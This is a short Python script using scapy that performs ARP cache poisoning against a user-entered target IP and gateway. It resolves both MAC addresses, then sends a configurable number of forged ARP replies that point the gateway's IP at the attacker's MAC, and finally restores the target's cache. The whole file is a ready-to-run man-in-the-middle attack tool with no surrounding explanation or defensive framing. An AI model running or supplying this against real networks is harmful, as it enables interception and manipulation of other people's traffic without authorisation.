import time
from typing import Optional

from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp, srp


def get_mac(ip_address: str) -> Optional[str]:
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip_address)
    answered = srp(request, timeout=3, verbose=False)[0]

    if not answered:
        return None

    return answered[0][1].hwsrc


def send_arp_reply(
    destination_mac: str,
    sender_ip: str,
    target_ip: str,
    target_mac: str,
    attacker_mac: str,
    count: int = 1,
) -> None:
    packet = (
        Ether(dst=destination_mac, src=attacker_mac)
        / ARP(op=2, psrc=sender_ip, hwsrc=attacker_mac, pdst=target_ip, hwdst=target_mac)
    )
    sendp(packet, count=count, inter=0.2, verbose=False)


def restore_target(target_ip: str, target_mac: str, gateway_ip: str, gateway_mac: str) -> None:
    packet = (
        Ether(dst=target_mac)
        / ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst=target_mac)
    )
    sendp(packet, count=5, inter=0.2, verbose=False)


def poison_target(target_ip: str, gateway_ip: str, packet_count: int, interval: float) -> None:
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if target_mac is None:
        print("Could not find target MAC address")
        return

    if gateway_mac is None:
        print("Could not find gateway MAC address")
        return

    attacker_mac = get_if_hwaddr(conf.iface)
    print(f"Target MAC: {target_mac}")
    print(f"Gateway MAC: {gateway_mac}")
    print(f"Attacker MAC: {attacker_mac}")
    print("Sending ARP cache poisoning packets")

    try:
        for _ in range(packet_count):
            send_arp_reply(target_mac, gateway_ip, target_ip, target_mac, attacker_mac)
            time.sleep(interval)
    finally:
        print("Restoring target ARP cache")
        restore_target(target_ip, target_mac, gateway_ip, gateway_mac)


def main() -> None:
    target_ip = input("Target IP: ").strip()
    gateway_ip = input("Gateway IP: ").strip()

    if not target_ip or not gateway_ip:
        print("Target IP and gateway IP are required. Stopping.")
        return

    try:
        packet_count = int(input("Poison packet count [8]: ").strip() or "8")
        interval = float(input("Seconds between packets [1.0]: ").strip() or "1.0")
    except ValueError:
        print("Please enter numbers for the count and interval values.")
        return

    poison_target(target_ip, gateway_ip, packet_count, interval)


if __name__ == "__main__":
    main()
